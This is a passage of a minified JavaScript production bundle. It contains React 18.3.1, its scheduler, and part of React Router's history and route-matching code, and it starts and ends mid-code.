Error(s(200));return Xc(null,e,t,!0,n)},t.hydrateRoot=function(e,t,n){if(!$c(e))throw Error(s(405));var r=null!=n&&n.hydratedSources||null,a=!1,o="",i=Kc;if(null!==n&&void 0!==n&&(!0===n.unstable_strictMode&&(a=!0),void 0!==n.identifierPrefix&&(o=n.identifierPrefix),void 0!==n.onRecoverableError&&(i=n.onRecoverableError)),t=Fc(t,null,e,1,null!=n?n:null,a,0,o,i),e[pa]=t.current,Vr(e),r)for(e=0;e<r.length;e++)a=(a=(n=r[e])._getVersion)(n._source),null==t.mutableSourceEagerHydrationData?t.mutableSourceEagerHydrationData=[n,a]:t.mutableSourceEagerHydrationData.push(n,a);return new Jc(t)},t.render=function(e,t,n){if(!Qc(t))throw Error(s(200));return Xc(null,e,t,!1,n)},t.unmountComponentAtNode=function(e){if(!Qc(e))throw Error(s(40));return!!e._reactRootContainer&&(cc(function(){Xc(null,null,e,!1,function(){e._reactRootContainer=null,e[pa]=null})}),!0)},t.unstable_batchedUpdates=lc,t.unstable_renderSubtreeIntoContainer=function(e,t,n,r){if(!Qc(n))throw Error(s(200));if(null==e||void 0===e._reactInternals)throw Error(s(38));return Xc(e,t,n,!1,r)},t.version="18.3.1-next-f1338f8080-20240426"},391(e,t,n){var r=n(950);t.createRoot=r.createRoot,t.hydrateRoot=r.hydrateRoot},950(e,t,n){!function e(){if("undefined"!==typeof __REACT_DEVTOOLS_GLOBAL_HOOK__&&"function"===typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE)try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(e)}catch(t){console.error(t)}}(),e.exports=n(730)},153(e,t,n){var r=n(43),a=Symbol.for("react.element"),s=Symbol.for("react.fragment"),o=Object.prototype.hasOwnProperty,i=r.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentOwner,l={key:!0,ref:!0,__self:!0,__source:!0};function c(e,t,n){var r,s={},c=null,u=null;for(r in void 0!==n&&(c=""+n),void 0!==t.key&&(c=""+t.key),void 0!==t.ref&&(u=t.ref),t)o.call(t,r)&&!l.hasOwnProperty(r)&&(s[r]=t[r]);if(e&&e.defaultProps)for(r in t=e.defaultProps)void 0===s[r]&&(s[r]=t[r]);return{$$typeof:a,type:e,key:c,ref:u,props:s,_owner:i.current}}t.Fragment=s,t.jsx=c,t.jsxs=c},202(e,t){var n=Symbol.for("react.element"),r=Symbol.for("react.portal"),a=Symbol.for("react.fragment"),s=Symbol.for("react.strict_mode"),o=Symbol.for("react.profiler"),i=Symbol.for("react.provider"),l=Symbol.for("react.context"),c=Symbol.for("react.forward_ref"),u=Symbol.for("react.suspense"),d=Symbol.for("react.memo"),h=Symbol.for("react.lazy"),f=Symbol.iterator;var p={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},m=Object.assign,g={};function v(e,t,n){this.props=e,this.context=t,this.refs=g,this.updater=n||p}function y(){}function b(e,t,n){this.props=e,this.context=t,this.refs=g,this.updater=n||p}v.prototype.isReactComponent={},v.prototype.setState=function(e,t){if("object"!==typeof e&&"function"!==typeof e&&null!=e)throw Error("setState(...): takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,e,t,"setState")},v.prototype.forceUpdate=function(e){this.updater.enqueueForceUpdate(this,e,"forceUpdate")},y.prototype=v.prototype;var w=b.prototype=new y;w.constructor=b,m(w,v.prototype),w.isPureReactComponent=!0;var _=Array.isArray,k=Object.prototype.hasOwnProperty,x={current:null},S={key:!0,ref:!0,__self:!0,__source:!0};function E(e,t,r){var a,s={},o=null,i=null;if(null!=t)for(a in void 0!==t.ref&&(i=t.ref),void 0!==t.key&&(o=""+t.key),t)k.call(t,a)&&!S.hasOwnProperty(a)&&(s[a]=t[a]);var l=arguments.length-2;if(1===l)s.children=r;else if(1<l){for(var c=Array(l),u=0;u<l;u++)c[u]=arguments[u+2];s.children=c}if(e&&e.defaultProps)for(a in l=e.defaultProps)void 0===s[a]&&(s[a]=l[a]);return{$$typeof:n,type:e,key:o,ref:i,props:s,_owner:x.current}}function j(e){return"object"===typeof e&&null!==e&&e.$$typeof===n}var T=/\/+/g;function C(e,t){return"object"===typeof e&&null!==e&&null!=e.key?function(e){var t={"=":"=0",":":"=2"};return"$"+e.replace(/[=:]/g,function(e){return t[e]})}(""+e.key):t.toString(36)}function N(e,t,a,s,o){var i=typeof e;"undefined"!==i&&"boolean"!==i||(e=null);var l=!1;if(null===e)l=!0;else switch(i){case"string":case"number":l=!0;break;case"object":switch(e.$$typeof){case n:case r:l=!0}}if(l)return o=o(l=e),e=""===s?"."+C(l,0):s,_(o)?(a="",null!=e&&(a=e.replace(T,"$&/")+"/"),N(o,t,a,"",function(e){return e})):null!=o&&(j(o)&&(o=function(e,t){return{$$typeof:n,type:e.type,key:t,ref:e.ref,props:e.props,_owner:e._owner}}(o,a+(!o.key||l&&l.key===o.key?"":(""+o.key).replace(T,"$&/")+"/")+e)),t.push(o)),1;if(l=0,s=""===s?".":s+":",_(e))for(var c=0;c<e.length;c++){var u=s+C(i=e[c],c);l+=N(i,t,a,u,o)}else if(u=function(e){return null===e||"object"!==typeof e?null:"function"===typeof(e=f&&e[f]||e["@@iterator"])?e:null}(e),"function"===typeof u)for(e=u.call(e),c=0;!(i=e.next()).done;)l+=N(i=i.value,t,a,u=s+C(i,c++),o);else if("object"===i)throw t=String(e),Error("Objects are not valid as a React child (found: "+("[object Object]"===t?"object with keys {"+Object.keys(e).join(", ")+"}":t)+"). If you meant to render a collection of children, use an array instead.");return l}function R(e,t,n){if(null==e)return e;var r=[],a=0;return N(e,r,"","",function(e){return t.call(n,e,a++)}),r}function P(e){if(-1===e._status){var t=e._result;(t=t()).then(function(t){0!==e._status&&-1!==e._status||(e._status=1,e._result=t)},function(t){0!==e._status&&-1!==e._status||(e._status=2,e._result=t)}),-1===e._status&&(e._status=0,e._result=t)}if(1===e._status)return e._result.default;throw e._result}var O={current:null},A={transition:null},I={ReactCurrentDispatcher:O,ReactCurrentBatchConfig:A,ReactCurrentOwner:x};function L(){throw Error("act(...) is not supported in production builds of React.")}t.Children={map:R,forEach:function(e,t,n){R(e,function(){t.apply(this,arguments)},n)},count:function(e){var t=0;return R(e,function(){t++}),t},toArray:function(e){return R(e,function(e){return e})||[]},only:function(e){if(!j(e))throw Error("React.Children.only expected to receive a single React element child.");return e}},t.Component=v,t.Fragment=a,t.Profiler=o,t.PureComponent=b,t.StrictMode=s,t.Suspense=u,t.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=I,t.act=L,t.cloneElement=function(e,t,r){if(null===e||void 0===e)throw Error("React.cloneElement(...): The argument must be a React element, but you passed "+e+".");var a=m({},e.props),s=e.key,o=e.ref,i=e._owner;if(null!=t){if(void 0!==t.ref&&(o=t.ref,i=x.current),void 0!==t.key&&(s=""+t.key),e.type&&e.type.defaultProps)var l=e.type.defaultProps;for(c in t)k.call(t,c)&&!S.hasOwnProperty(c)&&(a[c]=void 0===t[c]&&void 0!==l?l[c]:t[c])}var c=arguments.length-2;if(1===c)a.children=r;else if(1<c){l=Array(c);for(var u=0;u<c;u++)l[u]=arguments[u+2];a.children=l}return{$$typeof:n,type:e.type,key:s,ref:o,props:a,_owner:i}},t.createContext=function(e){return(e={$$typeof:l,_currentValue:e,_currentValue2:e,_threadCount:0,Provider:null,Consumer:null,_defaultValue:null,_globalName:null}).Provider={$$typeof:i,_context:e},e.Consumer=e},t.createElement=E,t.createFactory=function(e){var t=E.bind(null,e);return t.type=e,t},t.createRef=function(){return{current:null}},t.forwardRef=function(e){return{$$typeof:c,render:e}},t.isValidElement=j,t.lazy=function(e){return{$$typeof:h,_payload:{_status:-1,_result:e},_init:P}},t.memo=function(e,t){return{$$typeof:d,type:e,compare:void 0===t?null:t}},t.startTransition=function(e){var t=A.transition;A.transition={};try{e()}finally{A.transition=t}},t.unstable_act=L,t.useCallback=function(e,t){return O.current.useCallback(e,t)},t.useContext=function(e){return O.current.useContext(e)},t.useDebugValue=function(){},t.useDeferredValue=function(e){return O.current.useDeferredValue(e)},t.useEffect=function(e,t){return O.current.useEffect(e,t)},t.useId=function(){return O.current.useId()},t.useImperativeHandle=function(e,t,n){return O.current.useImperativeHandle(e,t,n)},t.useInsertionEffect=function(e,t){return O.current.useInsertionEffect(e,t)},t.useLayoutEffect=function(e,t){return O.current.useLayoutEffect(e,t)},t.useMemo=function(e,t){return O.current.useMemo(e,t)},t.useReducer=function(e,t,n){return O.current.useReducer(e,t,n)},t.useRef=function(e){return O.current.useRef(e)},t.useState=function(e){return O.current.useState(e)},t.useSyncExternalStore=function(e,t,n){return O.current.useSyncExternalStore(e,t,n)},t.useTransition=function(){return O.current.useTransition()},t.version="18.3.1"},43(e,t,n){e.exports=n(202)},579(e,t,n){e.exports=n(153)},234(e,t){function n(e,t){var n=e.length;e.push(t);e:for(;0<n;){var r=n-1>>>1,a=e[r];if(!(0<s(a,t)))break e;e[r]=t,e[n]=a,n=r}}function r(e){return 0===e.length?null:e[0]}function a(e){if(0===e.length)return null;var t=e[0],n=e.pop();if(n!==t){e[0]=n;e:for(var r=0,a=e.length,o=a>>>1;r<o;){var i=2*(r+1)-1,l=e[i],c=i+1,u=e[c];if(0>s(l,n))c<a&&0>s(u,l)?(e[r]=u,e[c]=n,r=c):(e[r]=l,e[i]=n,r=i);else{if(!(c<a&&0>s(u,n)))break e;e[r]=u,e[c]=n,r=c}}}return t}function s(e,t){var n=e.sortIndex-t.sortIndex;return 0!==n?n:e.id-t.id}if("object"===typeof performance&&"function"===typeof performance.now){var o=performance;t.unstable_now=function(){return o.now()}}else{var i=Date,l=i.now();t.unstable_now=function(){return i.now()-l}}var c=[],u=[],d=1,h=null,f=3,p=!1,m=!1,g=!1,v="function"===typeof setTimeout?setTimeout:null,y="function"===typeof clearTimeout?clearTimeout:null,b="undefined"!==typeof setImmediate?setImmediate:null;function w(e){for(var t=r(u);null!==t;){if(null===t.callback)a(u);else{if(!(t.startTime<=e))break;a(u),t.sortIndex=t.expirationTime,n(c,t)}t=r(u)}}function _(e){if(g=!1,w(e),!m)if(null!==r(c))m=!0,A(k);else{var t=r(u);null!==t&&I(_,t.startTime-e)}}function k(e,n){m=!1,g&&(g=!1,y(j),j=-1),p=!0;var s=f;try{for(w(n),h=r(c);null!==h&&(!(h.expirationTime>n)||e&&!N());){var o=h.callback;if("function"===typeof o){h.callback=null,f=h.priorityLevel;var i=o(h.expirationTime<=n);n=t.unstable_now(),"function"===typeof i?h.callback=i:h===r(c)&&a(c),w(n)}else a(c);h=r(c)}if(null!==h)var l=!0;else{var d=r(u);null!==d&&I(_,d.startTime-n),l=!1}return l}finally{h=null,f=s,p=!1}}"undefined"!==typeof navigator&&void 0!==navigator.scheduling&&void 0!==navigator.scheduling.isInputPending&&navigator.scheduling.isInputPending.bind(navigator.scheduling);var x,S=!1,E=null,j=-1,T=5,C=-1;function N(){return!(t.unstable_now()-C<T)}function R(){if(null!==E){var e=t.unstable_now();C=e;var n=!0;try{n=E(!0,e)}finally{n?x():(S=!1,E=null)}}else S=!1}if("function"===typeof b)x=function(){b(R)};else if("undefined"!==typeof MessageChannel){var P=new MessageChannel,O=P.port2;P.port1.onmessage=R,x=function(){O.postMessage(null)}}else x=function(){v(R,0)};function A(e){E=e,S||(S=!0,x())}function I(e,n){j=v(function(){e(t.unstable_now())},n)}t.unstable_IdlePriority=5,t.unstable_ImmediatePriority=1,t.unstable_LowPriority=4,t.unstable_NormalPriority=3,t.unstable_Profiling=null,t.unstable_UserBlockingPriority=2,t.unstable_cancelCallback=function(e){e.callback=null},t.unstable_continueExecution=function(){m||p||(m=!0,A(k))},t.unstable_forceFrameRate=function(e){0>e||125<e?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):T=0<e?Math.floor(1e3/e):5},t.unstable_getCurrentPriorityLevel=function(){return f},t.unstable_getFirstCallbackNode=function(){return r(c)},t.unstable_next=function(e){switch(f){case 1:case 2:case 3:var t=3;break;default:t=f}var n=f;f=t;try{return e()}finally{f=n}},t.unstable_pauseExecution=function(){},t.unstable_requestPaint=function(){},t.unstable_runWithPriority=function(e,t){switch(e){case 1:case 2:case 3:case 4:case 5:break;default:e=3}var n=f;f=e;try{return t()}finally{f=n}},t.unstable_scheduleCallback=function(e,a,s){var o=t.unstable_now();switch("object"===typeof s&&null!==s?s="number"===typeof(s=s.delay)&&0<s?o+s:o:s=o,e){case 1:var i=-1;break;case 2:i=250;break;case 5:i=1073741823;break;case 4:i=1e4;break;default:i=5e3}return e={id:d++,callback:a,priorityLevel:e,startTime:s,expirationTime:i=s+i,sortIndex:-1},s>o?(e.sortIndex=s,n(u,e),null===r(c)&&e===r(u)&&(g?(y(j),j=-1):g=!0,I(_,s-o))):(e.sortIndex=i,n(c,e),m||p||(m=!0,A(k))),e},t.unstable_shouldYield=N,t.unstable_wrapCallback=function(e){var t=f;return function(){var n=f;f=t;try{return e.apply(this,arguments)}finally{f=n}}}},853(e,t,n){e.exports=n(234)}},t={};function n(r){var a=t[r];if(void 0!==a)return a.exports;var s=t[r]={exports:{}};return e[r](s,s.exports,n),s.exports}(()=>{var e,t=Object.getPrototypeOf?e=>Object.getPrototypeOf(e):e=>e.__proto__;n.t=function(r,a){if(1&a&&(r=this(r)),8&a)return r;if("object"===typeof r&&r){if(4&a&&r.__esModule)return r;if(16&a&&"function"===typeof r.then)return r}var s=Object.create(null);n.r(s);var o={};e=e||[null,t({}),t([]),t(t)];for(var i=2&a&&r;("object"==typeof i||"function"==typeof i)&&!~e.indexOf(i);i=t(i))Object.getOwnPropertyNames(i).forEach(e=>o[e]=()=>r[e]);return o.default=()=>r,n.d(s,o),s}})(),n.d=(e,t)=>{for(var r in t)n.o(t,r)&&!n.o(e,r)&&Object.defineProperty(e,r,{enumerable:!0,get:t[r]})},n.g=function(){if("object"===typeof globalThis)return globalThis;try{return this||new Function("return this")()}catch(e){if("object"===typeof window)return window}}(),n.o=(e,t)=>Object.prototype.hasOwnProperty.call(e,t),n.r=e=>{"undefined"!==typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(e,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(e,"__esModule",{value:!0})};var r,a=n(43),s=n.t(a,2),o=n(391);function i(){return i=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(e[r]=n[r])}return e},i.apply(this,arguments)}!function(e){e.Pop="POP",e.Push="PUSH",e.Replace="REPLACE"}(r||(r={}));const l="popstate";function c(e,t){if(!1===e||null===e||"undefined"===typeof e)throw new Error(t)}function u(e,t){if(!e){"undefined"!==typeof console&&console.warn(t);try{throw new Error(t)}catch(n){}}}function d(e,t){return{usr:e.state,key:e.key,idx:t}}function h(e,t,n,r){return void 0===n&&(n=null),i({pathname:"string"===typeof e?e:e.pathname,search:"",hash:""},"string"===typeof t?p(t):t,{state:n,key:t&&t.key||r||Math.random().toString(36).substr(2,8)})}function f(e){let{pathname:t="/",search:n="",hash:r=""}=e;return n&&"?"!==n&&(t+="?"===n.charAt(0)?n:"?"+n),r&&"#"!==r&&(t+="#"===r.charAt(0)?r:"#"+r),t}function p(e){let t={};if(e){let n=e.indexOf("#");n>=0&&(t.hash=e.substr(n),e=e.substr(0,n));let r=e.indexOf("?");r>=0&&(t.search=e.substr(r),e=e.substr(0,r)),e&&(t.pathname=e)}return t}function m(e,t,n,a){void 0===a&&(a={});let{window:s=document.defaultView,v5Compat:o=!1}=a,u=s.history,p=r.Pop,m=null,g=v();function v(){return(u.state||{idx:null}).idx}function y(){p=r.Pop;let e=v(),t=null==e?null:e-g;g=e,m&&m({action:p,location:w.location,delta:t})}function b(e){let t="null"!==s.location.origin?s.location.origin:s.location.href,n="string"===typeof e?e:f(e);return n=n.replace(/ $/,"%20"),c(t,"No window.location.(origin|href) available to create URL for href: "+n),new URL(n,t)}null==g&&(g=0,u.replaceState(i({},u.state,{idx:g}),""));let w={get action(){return p},get location(){return e(s,u)},listen(e){if(m)throw new Error("A history only accepts one active listener");return s.addEventListener(l,y),m=e,()=>{s.removeEventListener(l,y),m=null}},createHref:e=>t(s,e),createURL:b,encodeLocation(e){let t=b(e);return{pathname:t.pathname,search:t.search,hash:t.hash}},push:function(e,t){p=r.Push;let a=h(w.location,e,t);n&&n(a,e),g=v()+1;let i=d(a,g),l=w.createHref(a);try{u.pushState(i,"",l)}catch(c){if(c instanceof DOMException&&"DataCloneError"===c.name)throw c;s.location.assign(l)}o&&m&&m({action:p,location:w.location,delta:1})},replace:function(e,t){p=r.Replace;let a=h(w.location,e,t);n&&n(a,e),g=v();let s=d(a,g),i=w.createHref(a);u.replaceState(s,"",i),o&&m&&m({action:p,location:w.location,delta:0})},go:e=>u.go(e)};return w}var g;!function(e){e.data="data",e.deferred="deferred",e.redirect="redirect",e.error="error"}(g||(g={}));new Set(["lazy","caseSensitive","path","id","index","children"]);function v(e,t,n){return void 0===n&&(n="/"),y(e,t,n,!1)}function y(e,t,n,r){let a=O(("string"===typeof t?p(t):t).pathname||"/",n);if(null==a)return null;let s=b(e);!function(e){e.sort((e,t)=>e.score!==t.score?t.score-e.score:function(e,t){let n=e.length===t.length&&e.slice(0,-1).every((e,n)=>e===t[n]);return n?e[e.length-1]-t[t.length-1]:0}(e.routesMeta.map(e=>e.childrenIndex),t.routesMeta.map(e=>e.childrenIndex)))}(s);let o=null;for(let i=0;null==o&&i<s.length;++i){let e=P(a);o=N(s[i],e,r)}return o}function b(e,t,n,r){void 0===t&&(t=[]),void 0===n&&(n=[]),void 0===r&&(r="");let a=(e,a,s)=>{let o={relativePath:void 0===s?e.path||"":s,caseSensitive:!0===e.caseSensitive,childrenIndex:a,route:e};o.relativePath.startsWith("/")&&(c(o.relativePath.startsWith(r),'Absolute route path "'+o.relativePath+'" nested under path "'+r+'" is not valid. An absolute child route path must start with the combined path of all its parent routes.'),o.relativePath=o.relativePath.slice(r.length));let i=B([r,o.relativePath]),l=n.concat(o);e.children&&e.children.length>0&&(c(!0!==e.index,'Index routes must not have child routes. Please remove all child routes from route path "'+i+'".'),b(e.children,t,l,i)),(null!=e.path||e.index)&&t.push({path:i,score:C(i,e.index),routesMeta:l})};return e.forEach((e,t)=>{var n;if(""!==e.path&&null!=(n=e.path)&&n.includes("?"))for(let r of w(e.path))a(e,t,r);else a(e,t)}),t}function w(e){let t=e.split("/");if(0===t.length)return[];let[n,...r]=t,a=n.endsWith("?"),s=n.replace(/\?$/,"");if(0===r.length)return a?[s,""]:[s];let o=w(r.join("/")),i=[];return i.push(...o.map(e=>""===e?s:[s,e].join("/"))),a&&i.push(...o),i.map(t=>e.startsWith("/")&&""===t?"/":t)}const _=/^:[\w-]+$/,k=3,x=2,S=1,E=10,j=-2,T=e=>"*"===e;function C(e,t){let n=e.split("/"),r=n.length;return n.some(T)&&(r+=j),t&&(r+=x),n.filter(e=>!T(e)).reduce((e,t)=>e+(_.test(t)?k:""===t?S:E),r)}function N(e,t,n){void 0===n&&(n=!1);let{routesMeta:r}=e,a={},s="/",o=[];for(let i=0;i<r.length;++i){let e=r[i],l=i===r.length-1,c="/"===s?t:t.slice(s.length)||"/",u=R({path:e.relativePath,caseSensitive:e.caseSensitive,end:l},c),d=e.route;if(!u&&l&&n&&!r[r.length-1].route.index&&(u=R({path:e.relativePath,caseSensitive:e.caseSensitive,end:!1},c)),!u)return null;Object.assign(a,u.params),o.push({params:a,pathname:B([s,u.pathname]),pathnameBase:F(B([s,u.pathnameBase])),route:d}),"/"!==u.pathnameBase&&(s=B([s,u.pathnameBase]))}return o}function R(e,t){"string"===typeof e&&(e={path:e,caseSensitive:!1,end:!0});let[n,r]=function(e,t,n){void 0===t&&(t=!1);void 0===n&&(n=!0);u("*"===e||!e.endsWith("*")||e.endsWith("/*"),'Route path "'+e+'" will be treated as if it were "'+e.replace(/\*$/,"/*")+'" because the `*` character must always follow a `/` in the pattern. To get rid of this warning, please change the route path to "'+e.replace(/\*$/,"/*")+'".');let r=[],a="^"+e.replace(/\/*\*?$/,"").replace(/^\/*/,"/").replace(/[\\.*+^${}|()[\]]/g,"\\$&").replace(/\/:([\w-]+)(\?)?/g,(e,t,n)=>(r.push({paramName:t,isOptional:null!=n}),n?"/?([^\\/]+)?":"/([^\\/]+)"));e.endsWith("*")?(r.push({paramName:"*"}),a+="*"===e||"/*"===e?"(.*)$":"(?:\\/(.+)|\\/*)$"):n?a+="\\/*$":""!==e&&"/"!==e&&(a+="(?:(?=\\/|$))");let s=new RegExp(a,t?void 0:"i");return[s,r]}(e.path,e.caseSensitive,e.end),a=t.match(n);if(!a)return null;let s=a[0],o=s.replace(/(.)\/+$/,"$1"),i=a.slice(1);return{params:r.reduce((e,t,n)=>{let{paramName:r,isOptional:a}=t;if("*"===r){let e=i[n]||"";o=s.slice(0,s.length-e.length).replace(/(.)\/+$/,"$1")}const l=i[n];return e[r]=a&&!l?void 0:(l||"").replace(/%2F/g,"/"),e},{}),pathname:s,pathnameBase:o,pattern:e}}function P(e){try{return e.split("/").map(e=>decodeURIComponent(e).replace(/\//g,"%2F")).join("/")}catch(t){return u(!1,'The URL path "'+e+'" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent encoding ('+t+")."),e}}function O(e,t){if("/"===t)return e;if(!e.toLowerCase().startsWith(t.toLowerCase()))return null;let n=t.endsWith("/")?t.length-1:t.length,r=e.charAt(n);return r&&"/"!==r?null:e.slice(n)||"/"}const A=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i;function I(e,t){void 0===t&&(t="/");let n,{pathname:r,search:a="",hash:s=""}="string"===typeof e?p(e):e;if(r)if(o=r,A.test(o))n=r;else{if(r.includes("//")){let e=r;r=r.replace(/\/\/+/g,"/"),u(!1,"Pathnames cannot have embedded double slashes - normalizing "+e+" -> "+r)}n=r.startsWith("/")?L(r.substring(1),"/"):L(r,t)}else n=t;var o;return{pathname:n,search:V(a),hash:q(s)}}function L(e,t){let n=t.replace(/\/+$/,"").split("/");return e.split("/").forEach(e=>{".."===e?n.length>1&&n.pop():"."!==e&&n.push(e)}),n.length>1?n.join("/"):"/"}function D(e,t,n,r){return"Cannot include a '"+e+"' character in a manually specified `to."+t+"` field ["+JSON.stringify(r)+"].  Please separate it out to the `to."+n+'` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.'}function U(e){return e.filter((e,t)=>0===t||e.route.path&&e.route.path.length>0)}function M(e,t){let n=U(e);return t?n.map((e,t)=>t===n.length-1?e.pathname:e.pathnameBase):n.map(e=>e.pathnameBase)}function z(e,t,n,r){let a;void 0===r&&(r=!1),"string"===typeof e?a=p(e):(a=i({},e),c(!a.pathname||!a.pathname.includes("?"),D("?","pathname","search",a)),c(!a.pathname||!a.pathname.includes("#"),D("#","pathname","hash",a)),c(!a.search||!a.search.includes("#"),D("#","search","hash",a)));let s,o=""===e||""===a.pathname,l=o?"/":a.pathname;if(null==l)s=n;else{let e=t.length-1;if(!r&&l.startsWith("..")){let t=l.split("/");for(;".."===t[0];)t.shift(),e-=1;a.pathname=t.join("/")}s=e>=0?t[e]:"/"}let u=I(a,s),d=l&&"/"!==l&&l.endsWith("/"),h=(o||"."===l)&&n.endsWith("/");return u.pathname.endsWith("/")||!d&&!h||(u.pathname+="/"),u}const B=e=>e.join("/").replace(/\/\/+/g,"/"),F=e=>e.replace(/\/+$/,"").replace(/^\/*/,"/"),V=e=>e&&"?"!==e?e.startsWith("?")?e:"?"+e:"",q=e=>e&&"#"!==e?e.startsWith("#")?e:"#"+e:"";Error;function W(e){return null!=e&&"number"===typeof e.status&&"string"===typeof e.statusText&&"boolean"===typeof e.internal&&"data"in e}const H=["post","put","patch","delete"],K=(new Set(H),["get",...H]);new Set(K),new Set([301,302,303,307,308]),new Set([307,308]);Symbol("deferred");function G(){return G=Object.assign?Object.assign.bind():function(e){for(var t=1;t<arguments.length;t++){var n=arguments[t];for(var r in n)Object.prototype.hasOwnProperty.call(n,r)&&(e[r]=n[r])}return e},G.apply(this,arguments)}const J=a.createContext(null);const $=a.createContext(null);const Q=a.createContext(null);const Y=a.createContext(null);const X=a.createContext({outlet:null,matches:[],isDataRoute:!1});const Z=a.createContext(null);function ee(){return null!=a.useContext(Y)}function te(){return ee()||c(!1),a.useContext(Y).location}function ne(e){a.useContext(Q).static||a.useLayoutEffect(e)}function re(){let{isDataRoute:e}=a.useContext(X);return e?function(){let{router:e}=he(ue.UseNavigateStable),t=pe(de.UseNavigateStable),n=a.useRef(!1);return ne(()=>{n.current=!0}),a.useCallback(function(r,a){void 0===a&&(a={}),n.current&&("number"===typeof r?e.navigate(r):e.navigate(r,G({fromRouteId:t},a)))},[e,t])}():function(){ee()||c(!1);let e=a.useContext(J),{basename:t,future:n,navigator:r}=a.useContext(Q),{matches:s}=a.useContext(X),{pathname:o}=te(),i=JSON.stringify(M(s,n.v7_relativeSplatPath)),l=a.useRef(!1);return ne(()=>{l.current=!0}),a.useCallback(function(n,a){if(void 0===a&&(a={}),!l.current)return;if("number"===typeof n)return void r.go(n);let s=z(n,JSON.parse(i),o,"path"===a.relative);null==e&&"/"!==t&&(s.pathname="/"===s.pathname?t:B([t,s.pathname])),(a.replace?r.replace:r.push)(s,a.state,a)},[t,r,i,o,e])}()}function ae(e,t,n,s){ee()||c(!1);let{navigator:o}=a.useContext(Q),{matches:i}=a.useContext(X),l=i[i.length-1],u=l?l.params:{},d=(l&&l.pathname,l?l.pathnameBase:"/");l&&l.route;let h,f=te();if(t){var m;let e="string"===typeof t?p(t):t;"/"===d||(null==(m=e.pathname)?void 0:m.startsWith(d))||c(!1),h=e}else h=f;let g=h.pathname||"/",y=g;if("/"!==d){let e=d.replace(/^\//,"").split("/");y="/"+g.replace(/^\//,"").split("/").slice(e.length).join("/")}let b=v(e,{pathname:y});let w=ce(b&&b.map(e=>Object.assign({},e,{params:Object.assign({},u,e.params),pathname:B([d,o.encodeLocation?o.encodeLocation(e.pathname).pathname:e.pathname]),pathnameBase:"/"===e.pathnameBase?d:B([d,o.encodeLocation?o.encodeLocation(e.pathnameBase).pathname:e.pathnameBase])})),i,n,s);return t&&w?a.createElement(Y.Provider,{value:{location:G({pathname:"/",search:"",hash:"",state:null,key:"default"},h),navigationType:r.Pop}},w):w}function se(){let e=function(){var e;let t=a.useContext(Z),n=fe(de.UseRouteError),r=pe(de.UseRouteError);if(void 0!==t)return t;return null==(e=n.errors)?void 0:e[r]}(),t=W(e)?e.status+" "+e.statusText:e instanceof Error?e.message:JSON.stringify(e),n=e instanceof Error?e.stack:null,r="rgba(200,200,200, 0.5)",s={padding:"0.5rem",backgroundColor:r};return a.createElement(a.Fragment,null,a.createElement("h2",null,"Unexpected Application Error!"),a.createElement("h3",{style:{fontStyle:"italic"}},t),n?a.createElement("pre",{style:s},n):null,null)}const oe=a.createElement(se,null);class ie extends a.Component{constructor(e){super(e),this.state={location:e.location,revalidation:e.revalidation,error:e.error}}static getDerivedStateFromError(e){return{error:e}}static getDerivedStateFromProps(e,t){return t.location!==e.location||"idle"!==t.revalidation&&"idle"===e.revalidation?{error:e.error,location:e.location,revalidation:e.revalidation}:{error:void 0!==e.error?e.error:t.error,location:t.location,revalidation:e.revalidation||t.revalidation}}componentDidCatch(e,t){console.error("React Router caught the following error during render",e,t)}render(){return void 0!==this.state.error?a.createElement(X.Provider,{value:this.props.routeContext},a.createElement(Z.Provider,{value:this.state.error,children:this.props.component})):this.props.children}}function le(e){let{routeContext:t,match:n,children:r}=e,s=a.useContext(J);return s&&s.static&&s.staticContext&&(n.route.errorElement||n.route.ErrorBoundary)&&(s.staticContext._deepestRenderedBoundaryId=n.route.id),a.createElement(X.Provider,{value:t},r)}function ce(e,t,n,r){var s;if(void 0===t&&(t=[]),void 0===n&&(n=null),void 0===r&&(r=null),null==e){var o;if(!n)return null;if(n.errors)e=n.matches;else{if(!(null!=(o=r)&&o.v7_partialHydration&&0===t.length&&!n.initialized&&n.matches.length>0))return null;e=n.matches}}let i=e,l=null==(s=n)?void 0:s.errors;if(null!=l){let e=i.findIndex(e=>e.route.id&&void 0!==(null==l?void 0:l[e.route.id]));e>=0||c(!1),i=i.slice(0,Math.min(i.length,e+1))}let u=!1,d=-1;if(n&&r&&r.v7_partialHydration)for(let a=0;a<i.length;a++){let e=i[a];if((e.route.HydrateFallback||e.route.hydrateFallbackElement)&&(d=a),e.route.id){let{loaderData:t,errors:r}=n,a=e.route.loader&&void 0===t[e.route.id]&&(!r||void 0===r[e.route.id]);if(e.route.lazy||a){u=!0,i=d>=0?i.slice(0,d+1):[i[0]];break}}}return i.reduceRight((e,r,s)=>{let o,c=!1,h=null,f=null;var p;n&&(o=l&&r.route.id?l[r.route.id]:void 0,h=r.route.errorElement||oe,u&&(d<0&&0===s?(p="route-fallback",!1||me[p]||(me[p]=!0),c=!0,f=null):d===s&&(c=!0,f=r.route.hydrateFallbackElement||null)));let m=t.concat(i.slice(0,s+1)),g=()=>{let t;return t=o?h:c?f:r.route.Component?a.createElement(r.route.Component,null):r.route.element?r.route.element:e,a.createElement(le,{match:r,routeContext:{outlet:e,matches:m,isDataRoute:null!=n},children:t})};return n&&(r.route.ErrorBoundary||r.route.errorElement||0===s)?a.createElement(ie,{location:n.location,revalidation:n.revalidation,component:h,error:o,children:g(),routeContext:{outlet:null,matches:m,isDataRoute:!0}}):g()},null)}var ue=function(e){return e.UseBlocker="useBlocker",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e}(ue||{}),de=function(e){return 